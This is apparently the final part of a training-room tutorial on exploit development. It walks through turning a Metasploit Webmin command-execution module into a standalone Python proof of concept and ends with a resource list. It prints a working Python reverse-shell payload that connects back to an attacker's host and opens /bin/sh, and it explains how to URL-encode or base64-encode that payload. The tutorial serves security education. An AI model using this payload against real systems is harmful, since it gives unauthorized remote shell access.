The point here is, do not feel discouraged if you try things that do not work, some would argue you cannot learn without failure. Keeping note of what did not work, what is unsuccessful is critical in becoming a better exploit developer. Each mistake is a learning opportunity and gives you more experience. If you are ever unsure if a segment of code will work it's beneficial to individually test parts of it. **Trial and error** is one of the most important concepts to master so I believe it is vital to highlight what went wrong.

The payload function was not as straightforward initially. The assumption was to determine a way to pipe the output of one function to another function, the random character to the payload function. I falsely assumed that you couldn't simply embed functions inside of a string to be included in the URL. I had guessed to upload the payload via the data parameter of the POST request, as it permits file objects. Consequentially I completely ignored the fact that we had **arbitrary command execution** and did not have to strictly use python.

If we wanted to execute the system shell strictly with python, we can use the `subprocess` module. There are several ways to open the system shell using this module, I've listed examples below. It's also important to understand that not all systems will have python3 as the default python application, the version of python executed on the system must be considered.

![Subprocess Alternatives](Images/Subprocess_Alternatives.png)

The main difference between the three methods is `subprocess.popen()` does not wait for the program to finish and simply continues executing. This is not useful to us as we need the complete output to send over the socket.

`subprocess.run()` uses a CompletedProcess object with a stdout attribute. This means the subprocess will return bytes as the output that we'll need to decode into a string in order to call/format the payload inside of the URL string. **The type of data must be equal**.

This was the original function with the subsequent error message.

![Webmin Failed Exploit Attempt](Images/Webmin_Failed_Exploit_Attempt.png)

There are several mistakes here.

- I was unaware that `subprocess.run()` wasn't used until python3
- I didn't properly encode/decode the payload function, I received a response of b' ' meaning the POST request was empty
- The socket is opening on the attackers computer instead of the victim computer

The output was decoded as a string without first encoding it in [base64](https://medium.com/swlh/powering-the-internet-with-base64-d823ec5df747#:~:text=Data%20transmission%3A%20Base64%20can%20simply,avoid%20depending%20on%20external%20files.) or HTML encoding. The order matters because of the direction data flows. We could use the base64 or [urllib.parse](https://docs.python.org/3/library/urllib.parse.html) libraries to encode the payload with ASCII characters for the systems to properly exchange data over the socket.

We can use the payload below to invoke `subprocess.call` in a single python command by opening a socket on the target machine and calling the system shell.

```python
payload = "python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""+ lhost + "\"," + lport + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"])\'"
```

From the metasploit module's use of `payload.encoded` as the attack vector is through a URL, we might assume that the data has to be URL encoded.

`urlEncode = urllib.parse.quote(payload)`

We can also manually encode/decode the payload with [base64](https://stackabuse.com/encoding-and-decoding-base64-strings-in-python/) in the event that the use of many characters would break in transit to the URI. In this scenario even though the payload does not break, **every system is different**. This emphasizes the need to understand how data is sent in case the payload doesn't execute without specifying the types of encoding necessary for the systems to communicate.

![Webmin Payload Function](Images/Webmin_Payload_Function.png)

All three of these solutions are feasible and have been tested to work in this example. I encourage you to test them yourself as well.

### Task 7 -  Thoughts and resources

Well...that was a lot to process. Let's review everything we learned in this room, we learned...

- what exploit development is and why we should learn it
- how to begin writing PoC scripts with appropriate parameters
- how to begin identifing vulnerabilities in code and point out the exploitable endpoints
- common exploit development methodologies
- reading metasploit source code
- using a wide range of resources to craft scripts

I want to emphasize that this is only one example upon the millions of vulnerabilities that exist and covering every unique one in a short amount of time is impossible, what matters is generating a method and approach. I also want to emphasize that Metasploit is not the only resource out there for developing PoC scripts and exploits in general, they are one of the largest so its an excellent resource for learning by example. I encourage you to find other resources for vulnerable open source software and create your own test environment with virtual machines and containers to use privately. Exploit development is a wide ranging skill from the scope covered in this room to advanced security researching discovering undisclosed and unknown vulnerabilities. As with any skill in life, **the more you practice the more proficient you'll become**. While I'm new to information security, in my opinion you don't need to be a genius to develop exploits. As long as you have patience, research skills, an open mind, diligence and perseverance, you can accomplish any task you set out for.

#### Resources for exploit development

- Metasploit resources (module source code, [msfevnom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom))
- exploitdb (`searchsploit`), hackerone, 0day, packet storm, secfocus, vulndb, cvedetails, github, vulners
- [Converting Metasploit Module to Stand Alone](https://netsec.ws/?p=262)
- [Null-Byte Exploit Development - Everything You Need to Know](https://null-byte.wonderhowto.com/how-to/exploit-development-everything-you-need-know-0167801/)
- [Violent Python - A Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security](https://github.com/tanc7/hacking-books/blob/master/Violent%20Python%20-%20A%20Cookbook%20for%20Hackers%2C%20Forensic%20Analysts%2C%20Penetration%20Testers%20and%20Security%20Engineers.pdf)
- [What is a proof of concept exploit?](https://searchsecurity.techtarget.com/definition/proof-of-concept-PoC-exploit)

I sincerely hope you found value in this room and I thank you for the time. Good luck with your infosec journey :)

For additional information, please see the references below.

## References

- [Converting Metasploit Module to Stand Alone](https://netsec.ws/?p=262)
- [Exploit (computer security) - Wikipedia](https://en.wikipedia.org/wiki/Exploit_(computer_security))
- [Null-Byte Exploit Development - Everything You Need to Know](https://null-byte.wonderhowto.com/how-to/exploit-development-everything-you-need-know-0167801/)
- [Python (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Python_(programming_language))
- [requests - PyPI Module](https://pypi.org/project/requests/)
- [requests - ReadTheDocs](https://requests.readthedocs.io/en/latest/)
- [Ruby (programming language) - Wikipedia](https://en.wikipedia.org/wiki/Ruby_(programming_language))
- [secrets module - Python](https://docs.python.org/3/library/secrets.html)
- [What is a proof of concept exploit?](https://searchsecurity.techtarget.com/definition/proof-of-concept-PoC-exploit)
